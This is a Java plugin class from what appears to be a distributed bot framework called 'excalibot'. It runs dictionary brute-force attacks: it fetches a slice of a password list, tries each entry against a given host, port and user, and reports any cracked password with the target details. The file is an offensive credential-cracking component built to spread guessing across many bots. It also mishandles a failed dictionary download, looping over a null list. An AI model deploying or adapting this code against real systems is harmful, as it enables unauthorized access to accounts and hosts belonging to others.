package org.powertrip.excalibot.common.plugins.bruteforce;

import org.powertrip.excalibot.common.com.SubTask;
import org.powertrip.excalibot.common.com.SubTaskResult;
import org.powertrip.excalibot.common.plugins.KnightPlug;
import org.powertrip.excalibot.common.plugins.bruteforce.bruteforce.Bruteforce;
import org.powertrip.excalibot.common.plugins.interfaces.knight.ResultManagerInterface;

import java.util.ArrayList;

public class Bot extends KnightPlug{
	public Bot(ResultManagerInterface resultManager) {
		super(resultManager);
	}

	@Override
	public boolean run(SubTask subTask) {
		SubTaskResult result = subTask.createResult();
		String host = subTask.getParameter("host");
		String user = subTask.getParameter("user");
        String port = subTask.getParameter("port");
        String dict = subTask.getParameter("dict");
		String lowerBound = subTask.getParameter("lowerBound");
        String higherBound = subTask.getParameter("higherBound");
        String password = null;

        ArrayList<String> dictionary = Bruteforce.downloadDictionary(dict, lowerBound, higherBound);
        if(dictionary == null) result.setSuccessful(false).setResponse("stdout", "Failed to download the dictionary");

        for(String s : dictionary) {
            if(Bruteforce.testPassword(host, port, user, s)){
                password = s;
                break;
            }
        }

        if(password != null) {
            result
                .setSuccessful(true)
                .setResponse("password", password)
                .setResponse("user", user)
                .setResponse("host", host)
                .setResponse("port", port);
        } else result.setSuccessful(false).setResponse("stdout", "Bruteforce failed");

		try {
			resultManager.returnResult(result);
			return result.isSuccessful();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		return false;
	}
}
